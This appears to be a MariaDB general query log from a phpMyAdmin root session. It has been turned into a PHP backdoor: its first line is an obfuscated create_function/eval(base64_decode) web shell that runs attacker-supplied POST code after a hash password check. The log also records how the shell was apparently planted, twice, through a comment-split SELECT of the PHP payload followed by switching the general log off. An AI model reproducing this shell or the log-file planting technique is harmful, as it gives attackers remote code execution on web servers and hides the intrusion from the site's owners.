<?php $CF='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';$EB=@$CF('$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e($x));');$EB('QHNlc3Npb25fc3RhcnQoKTtpZihpc3NldCgkX1BPU1RbJ2NvZGUnXSkpc3Vic3RyKHNoYTEobWQ1KCRfUE9TVFsnYSddKSksMzYpPT0nMjIyZicmJiRfU0VTU0lPTlsndGhlQ29kZSddPSRfUE9TVFsnY29kZSddO2lmKGlzc2V0KCRfU0VTU0lPTlsndGhlQ29kZSddKSlAZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VTU0lPTlsndGhlQ29kZSddKSk7'); ?>
/usr/sbin/mysqld, Version: 10.1.41-MariaDB-0+deb9u1 (Debian 9.9). started with:
Tcp port: 0  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
		108666 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		108666 Query	SELECT (COUNT(DB_first_level) DIV 100) * 100 from (  SELECT distinct SUBSTRING_INDEX(SCHEMA_NAME,  '_', 1)  DB_first_level  FROM INFORMATION_SCHEMA.SCHEMATA  WHERE `SCHEMA_NAME` < 'information_schema' ) t
		108666 Query	SELECT `SCHEMA_NAME` FROM `INFORMATION_SCHEMA`.`SCHEMATA`, (SELECT DB_first_level FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t ORDER BY DB_first_level ASC LIMIT 0, 100) t2 WHERE TRUE AND 1 = LOCATE(CONCAT(DB_first_level, '_'), CONCAT(SCHEMA_NAME, '_')) ORDER BY SCHEMA_NAME ASC
		108665 Query	SELECT `db_name`, COUNT(*) AS `count` FROM `phpmyadmin`.`pma__navigationhiding` WHERE `username`='root' GROUP BY `db_name`
		108666 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		108666 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		108666 Init DB	information_schema
		108666 Query	SELECT @@lower_case_table_names
		108666 Query	SELECT *,
                `TABLE_SCHEMA`       AS `Db`,
                `TABLE_NAME`         AS `Name`,
                `TABLE_TYPE`         AS `TABLE_TYPE`,
                `ENGINE`             AS `Engine`,
                `ENGINE`             AS `Type`,
                `VERSION`            AS `Version`,
                `ROW_FORMAT`         AS `Row_format`,
                `TABLE_ROWS`         AS `Rows`,
                `AVG_ROW_LENGTH`     AS `Avg_row_length`,
                `DATA_LENGTH`        AS `Data_length`,
                `MAX_DATA_LENGTH`    AS `Max_data_length`,
                `INDEX_LENGTH`       AS `Index_length`,
                `DATA_FREE`          AS `Data_free`,
                `AUTO_INCREMENT`     AS `Auto_increment`,
                `CREATE_TIME`        AS `Create_time`,
                `UPDATE_TIME`        AS `Update_time`,
                `CHECK_TIME`         AS `Check_time`,
                `TABLE_COLLATION`    AS `Collation`,
                `CHECKSUM`           AS `Checksum`,
                `CREATE_OPTIONS`     AS `Create_options`,
                `TABLE_COMMENT`      AS `Comment`
            FROM `information_schema`.`TABLES` t
            WHERE `TABLE_SCHEMA` COLLATE utf8_bin
                IN ('information_schema')
                AND t.`TABLE_NAME` COLLATE utf8_bin = 'TABLES' ORDER BY Name ASC
		108666 Query	SELECT TABLE_NAME
            FROM information_schema.VIEWS
            WHERE TABLE_SCHEMA = 'information_schema'
                AND TABLE_NAME = 'TABLES'
                AND IS_UPDATABLE = 'YES'
		108665 Query	SELECT `tab` FROM `phpmyadmin`.`pma__usergroups` WHERE `allowed` = 'N' AND `tab` LIKE 'table%' AND `usergroup` = (SELECT usergroup FROM `phpmyadmin`.`pma__users` WHERE `username` = 'root')
		108665 Query	SELECT `label`, `id`, `query`, `dbase` AS `db`, IF (`user` = '', true, false) AS `shared` FROM `phpmyadmin`.`pma__bookmark` WHERE `user` = '' OR `user` = 'root'
		108666 Query	SHOW  COLUMNS FROM `information_schema`.`TABLES`
		108666 Query	SHOW INDEXES FROM `information_schema`.`TABLES`
		108666 Quit	
		108665 Quit	
		108667 Connect	phpmyadmin@localhost as anonymous on 
		108668 Connect	root@localhost as anonymous on 
		108668 Query	SELECT @@version, @@version_comment
		108668 Query	SET CHARACTER SET 'utf8mb4'
		108668 Query	SET collation_connection = 'utf8mb4_unicode_ci'
		108668 Query	SET lc_messages = 'en_US'
		108668 Query	SELECT CURRENT_USER()
		108668 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		108668 Query	SELECT DATABASE()
		108668 Init DB	information_schema
		108668 Query	S/**/E/**/L/**/E/**/C/**/T "<?php $CF='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';$EB=@$CF('$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e($x));');$EB('QHNlc3Npb25fc3RhcnQoKTtpZihpc3NldCgkX1BPU1RbJ2NvZGUnXSkpc3Vic3RyKHNoYTEobWQ1KCRfUE9TVFsnYSddKSksMzYpPT0nMjIyZicmJiRfU0VTU0lPTlsndGhlQ29kZSddPSRfUE9TVFsnY29kZSddO2lmKGlzc2V0KCRfU0VTU0lPTlsndGhlQ29kZSddKSlAZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VTU0lPTlsndGhlQ29kZSddKSk7'); ?>"
		108668 Query	SELECT (COUNT(DB_first_level) DIV 100) * 100 from (  SELECT distinct SUBSTRING_INDEX(SCHEMA_NAME,  '_', 1)  DB_first_level  FROM INFORMATION_SCHEMA.SCHEMATA  WHERE `SCHEMA_NAME` < 'information_schema' ) t
		108668 Query	SELECT `SCHEMA_NAME` FROM `INFORMATION_SCHEMA`.`SCHEMATA`, (SELECT DB_first_level FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t ORDER BY DB_first_level ASC LIMIT 0, 100) t2 WHERE TRUE AND 1 = LOCATE(CONCAT(DB_first_level, '_'), CONCAT(SCHEMA_NAME, '_')) ORDER BY SCHEMA_NAME ASC
		108667 Query	SELECT `db_name`, COUNT(*) AS `count` FROM `phpmyadmin`.`pma__navigationhiding` WHERE `username`='root' GROUP BY `db_name`
		108668 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		108668 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		108668 Init DB	information_schema
		108668 Query	SELECT @@lower_case_table_names
		108668 Query	SELECT *,
                `TABLE_SCHEMA`       AS `Db`,
                `TABLE_NAME`         AS `Name`,
                `TABLE_TYPE`         AS `TABLE_TYPE`,
                `ENGINE`             AS `Engine`,
                `ENGINE`             AS `Type`,
                `VERSION`            AS `Version`,
                `ROW_FORMAT`         AS `Row_format`,
                `TABLE_ROWS`         AS `Rows`,
                `AVG_ROW_LENGTH`     AS `Avg_row_length`,
                `DATA_LENGTH`        AS `Data_length`,
                `MAX_DATA_LENGTH`    AS `Max_data_length`,
                `INDEX_LENGTH`       AS `Index_length`,
                `DATA_FREE`          AS `Data_free`,
                `AUTO_INCREMENT`     AS `Auto_increment`,
                `CREATE_TIME`        AS `Create_time`,
                `UPDATE_TIME`        AS `Update_time`,
                `CHECK_TIME`         AS `Check_time`,
                `TABLE_COLLATION`    AS `Collation`,
                `CHECKSUM`           AS `Checksum`,
                `CREATE_OPTIONS`     AS `Create_options`,
                `TABLE_COMMENT`      AS `Comment`
            FROM `information_schema`.`TABLES` t
            WHERE `TABLE_SCHEMA` COLLATE utf8_bin
                IN ('information_schema')
                AND t.`TABLE_NAME` COLLATE utf8_bin = 'TABLES' ORDER BY Name ASC
		108668 Query	SELECT TABLE_NAME
            FROM information_schema.VIEWS
            WHERE TABLE_SCHEMA = 'information_schema'
                AND TABLE_NAME = 'TABLES'
                AND IS_UPDATABLE = 'YES'
		108667 Query	SELECT `tab` FROM `phpmyadmin`.`pma__usergroups` WHERE `allowed` = 'N' AND `tab` LIKE 'table%' AND `usergroup` = (SELECT usergroup FROM `phpmyadmin`.`pma__users` WHERE `username` = 'root')
		108667 Query	SELECT `label`, `id`, `query`, `dbase` AS `db`, IF (`user` = '', true, false) AS `shared` FROM `phpmyadmin`.`pma__bookmark` WHERE `user` = '' OR `user` = 'root'
		108668 Query	SHOW  COLUMNS FROM `information_schema`.`TABLES`
		108668 Query	SHOW INDEXES FROM `information_schema`.`TABLES`
		108668 Quit	
		108667 Quit	
		108669 Connect	phpmyadmin@localhost as anonymous on 
		108670 Connect	root@localhost as anonymous on 
		108670 Query	SELECT @@version, @@version_comment
		108670 Query	SET CHARACTER SET 'utf8mb4'
		108670 Query	SET collation_connection = 'utf8mb4_unicode_ci'
		108670 Query	SET lc_messages = 'en_US'
		108670 Query	SELECT CURRENT_USER()
		108670 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		108670 Query	SELECT DATABASE()
		108670 Init DB	information_schema
		108670 Query	SET GLOBAL general_log = 'OFF'
/usr/sbin/mysqld, Version: 10.1.41-MariaDB-0+deb9u1 (Debian 9.9). started with:
Tcp port: 0  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
		212636 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		212636 Query	SELECT (COUNT(DB_first_level) DIV 100) * 100 from (  SELECT distinct SUBSTRING_INDEX(SCHEMA_NAME,  '_', 1)  DB_first_level  FROM INFORMATION_SCHEMA.SCHEMATA  WHERE `SCHEMA_NAME` < 'information_schema' ) t
		212636 Query	SELECT `SCHEMA_NAME` FROM `INFORMATION_SCHEMA`.`SCHEMATA`, (SELECT DB_first_level FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t ORDER BY DB_first_level ASC LIMIT 0, 100) t2 WHERE TRUE AND 1 = LOCATE(CONCAT(DB_first_level, '_'), CONCAT(SCHEMA_NAME, '_')) ORDER BY SCHEMA_NAME ASC
		212635 Query	SELECT `db_name`, COUNT(*) AS `count` FROM `phpmyadmin`.`pma__navigationhiding` WHERE `username`='root' GROUP BY `db_name`
		212636 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		212636 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		212636 Init DB	information_schema
		212636 Query	SELECT @@lower_case_table_names
		212636 Query	SELECT *,
                `TABLE_SCHEMA`       AS `Db`,
                `TABLE_NAME`         AS `Name`,
                `TABLE_TYPE`         AS `TABLE_TYPE`,
                `ENGINE`             AS `Engine`,
                `ENGINE`             AS `Type`,
                `VERSION`            AS `Version`,
                `ROW_FORMAT`         AS `Row_format`,
                `TABLE_ROWS`         AS `Rows`,
                `AVG_ROW_LENGTH`     AS `Avg_row_length`,
                `DATA_LENGTH`        AS `Data_length`,
                `MAX_DATA_LENGTH`    AS `Max_data_length`,
                `INDEX_LENGTH`       AS `Index_length`,
                `DATA_FREE`          AS `Data_free`,
                `AUTO_INCREMENT`     AS `Auto_increment`,
                `CREATE_TIME`        AS `Create_time`,
                `UPDATE_TIME`        AS `Update_time`,
                `CHECK_TIME`         AS `Check_time`,
                `TABLE_COLLATION`    AS `Collation`,
                `CHECKSUM`           AS `Checksum`,
                `CREATE_OPTIONS`     AS `Create_options`,
                `TABLE_COMMENT`      AS `Comment`
            FROM `information_schema`.`TABLES` t
            WHERE `TABLE_SCHEMA` COLLATE utf8_bin
                IN ('information_schema')
                AND t.`TABLE_NAME` COLLATE utf8_bin = 'TABLES' ORDER BY Name ASC
		212636 Query	SELECT TABLE_NAME
            FROM information_schema.VIEWS
            WHERE TABLE_SCHEMA = 'information_schema'
                AND TABLE_NAME = 'TABLES'
                AND IS_UPDATABLE = 'YES'
		212635 Query	SELECT `tab` FROM `phpmyadmin`.`pma__usergroups` WHERE `allowed` = 'N' AND `tab` LIKE 'table%' AND `usergroup` = (SELECT usergroup FROM `phpmyadmin`.`pma__users` WHERE `username` = 'root')
		212635 Query	SELECT `label`, `id`, `query`, `dbase` AS `db`, IF (`user` = '', true, false) AS `shared` FROM `phpmyadmin`.`pma__bookmark` WHERE `user` = '' OR `user` = 'root'
		212636 Query	SHOW  COLUMNS FROM `information_schema`.`TABLES`
		212636 Query	SHOW INDEXES FROM `information_schema`.`TABLES`
		212636 Quit	
		212635 Quit	
200927 16:59:40	212637 Connect	phpmyadmin@localhost as anonymous on 
		212638 Connect	root@localhost as anonymous on 
		212638 Query	SELECT @@version, @@version_comment
		212638 Query	SET CHARACTER SET 'utf8mb4'
		212638 Query	SET collation_connection = 'utf8mb4_unicode_ci'
		212638 Query	SET lc_messages = 'en_US'
		212638 Query	SELECT CURRENT_USER()
		212638 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		212638 Query	SELECT DATABASE()
		212638 Init DB	information_schema
		212638 Query	S/**/E/**/L/**/E/**/C/**/T "<?php $CF='c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';$EB=@$CF('$x','e'.'v'.'a'.'l'.'(b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e($x));');$EB('QHNlc3Npb25fc3RhcnQoKTtpZihpc3NldCgkX1BPU1RbJ2NvZGUnXSkpc3Vic3RyKHNoYTEobWQ1KCRfUE9TVFsnYSddKSksMzYpPT0nMjIyZicmJiRfU0VTU0lPTlsndGhlQ29kZSddPSRfUE9TVFsnY29kZSddO2lmKGlzc2V0KCRfU0VTU0lPTlsndGhlQ29kZSddKSlAZXZhbChiYXNlNjRfZGVjb2RlKCRfU0VTU0lPTlsndGhlQ29kZSddKSk7'); ?>"
		212638 Query	SELECT (COUNT(DB_first_level) DIV 100) * 100 from (  SELECT distinct SUBSTRING_INDEX(SCHEMA_NAME,  '_', 1)  DB_first_level  FROM INFORMATION_SCHEMA.SCHEMATA  WHERE `SCHEMA_NAME` < 'information_schema' ) t
		212638 Query	SELECT `SCHEMA_NAME` FROM `INFORMATION_SCHEMA`.`SCHEMATA`, (SELECT DB_first_level FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t ORDER BY DB_first_level ASC LIMIT 0, 100) t2 WHERE TRUE AND 1 = LOCATE(CONCAT(DB_first_level, '_'), CONCAT(SCHEMA_NAME, '_')) ORDER BY SCHEMA_NAME ASC
		212637 Query	SELECT `db_name`, COUNT(*) AS `count` FROM `phpmyadmin`.`pma__navigationhiding` WHERE `username`='root' GROUP BY `db_name`
		212638 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		212638 Query	SELECT COUNT(*) FROM ( SELECT DISTINCT SUBSTRING_INDEX(SCHEMA_NAME, '_', 1) DB_first_level FROM INFORMATION_SCHEMA.SCHEMATA WHERE TRUE ) t
		212638 Init DB	information_schema
		212638 Query	SELECT @@lower_case_table_names
		212638 Query	SELECT *,
                `TABLE_SCHEMA`       AS `Db`,
                `TABLE_NAME`         AS `Name`,
                `TABLE_TYPE`         AS `TABLE_TYPE`,
                `ENGINE`             AS `Engine`,
                `ENGINE`             AS `Type`,
                `VERSION`            AS `Version`,
                `ROW_FORMAT`         AS `Row_format`,
                `TABLE_ROWS`         AS `Rows`,
                `AVG_ROW_LENGTH`     AS `Avg_row_length`,
                `DATA_LENGTH`        AS `Data_length`,
                `MAX_DATA_LENGTH`    AS `Max_data_length`,
                `INDEX_LENGTH`       AS `Index_length`,
                `DATA_FREE`          AS `Data_free`,
                `AUTO_INCREMENT`     AS `Auto_increment`,
                `CREATE_TIME`        AS `Create_time`,
                `UPDATE_TIME`        AS `Update_time`,
                `CHECK_TIME`         AS `Check_time`,
                `TABLE_COLLATION`    AS `Collation`,
                `CHECKSUM`           AS `Checksum`,
                `CREATE_OPTIONS`     AS `Create_options`,
                `TABLE_COMMENT`      AS `Comment`
            FROM `information_schema`.`TABLES` t
            WHERE `TABLE_SCHEMA` COLLATE utf8_bin
                IN ('information_schema')
                AND t.`TABLE_NAME` COLLATE utf8_bin = 'TABLES' ORDER BY Name ASC
		212638 Query	SELECT TABLE_NAME
            FROM information_schema.VIEWS
            WHERE TABLE_SCHEMA = 'information_schema'
                AND TABLE_NAME = 'TABLES'
                AND IS_UPDATABLE = 'YES'
		212637 Query	SELECT `tab` FROM `phpmyadmin`.`pma__usergroups` WHERE `allowed` = 'N' AND `tab` LIKE 'table%' AND `usergroup` = (SELECT usergroup FROM `phpmyadmin`.`pma__users` WHERE `username` = 'root')
		212637 Query	SELECT `label`, `id`, `query`, `dbase` AS `db`, IF (`user` = '', true, false) AS `shared` FROM `phpmyadmin`.`pma__bookmark` WHERE `user` = '' OR `user` = 'root'
		212638 Query	SHOW  COLUMNS FROM `information_schema`.`TABLES`
		212638 Query	SHOW INDEXES FROM `information_schema`.`TABLES`
		212638 Quit	
		212637 Quit	
200927 16:59:45	212639 Connect	phpmyadmin@localhost as anonymous on 
		212640 Connect	root@localhost as anonymous on 
		212640 Query	SELECT @@version, @@version_comment
		212640 Query	SET CHARACTER SET 'utf8mb4'
		212640 Query	SET collation_connection = 'utf8mb4_unicode_ci'
		212640 Query	SET lc_messages = 'en_US'
		212640 Query	SELECT CURRENT_USER()
		212640 Query	SHOW SESSION VARIABLES LIKE 'FOREIGN_KEY_CHECKS'
		212640 Query	SELECT DATABASE()
		212640 Init DB	information_schema
		212640 Query	SET GLOBAL general_log = 'OFF'
